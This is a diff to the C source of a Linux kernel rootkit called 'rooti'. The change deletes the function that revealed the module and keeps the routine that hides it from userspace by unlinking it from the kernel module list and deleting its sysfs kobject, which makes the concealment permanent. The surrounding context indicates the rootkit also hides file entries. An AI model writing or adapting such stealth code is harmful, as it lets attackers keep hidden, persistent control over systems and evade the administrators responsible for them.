@@ -8,33 +8,14 @@
 #include "../utils.h"
 #include "../config.h"
 
-/* 
-    Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
-    When hidden, the variable prev_module stores the address of the node that was previously
-    before this module in the list, otherwise it is NULL.
-*/
-bool rooti_hidden = false;
-static struct list_head *prev_module = NULL;
-
 /*
     Hides the rootkit from userspace by removing it from the kernel modules list
-    and deleting its kobject from the syfs hierarchy.
+    and deleting its kobject from the sysfs hierarchy.
 */
 void rooti_hideme()
 {
-    rooti_hidden = true;
-    prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
-    
-}
-
-// Reveals this rootkit by re-adding it to the kernel modules list.
-void rooti_showme()
-{
-    rooti_hidden = false;
-    list_add(&THIS_MODULE->list, prev_module);
-    prev_module = NULL;
 }
 
 // Determines whether the file entry qualifies to be hidden
